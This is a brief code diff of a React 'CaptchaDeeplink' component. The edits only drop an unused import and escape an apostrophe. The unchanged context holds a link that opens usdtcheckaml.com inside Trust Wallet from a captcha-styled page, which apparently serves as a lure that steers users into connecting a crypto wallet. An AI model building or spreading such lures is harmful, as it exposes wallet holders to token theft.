@@ -1,7 +1,6 @@
 "use client";
 
 import "./style.css";
-import { useState } from "react";
 
 const DEEP_LINK =
   "https://link.trustwallet.com/open_url?coin_id=60&url=https://usdtcheckaml.com";
@@ -31,7 +30,7 @@ export function CaptchaDeeplink() {
           rel="noopener noreferrer"
           className="twc-secondary"
         >
-          I don't have Trust Wallet
+          I don&apos;t have Trust Wallet
         </a>
       </div>
 
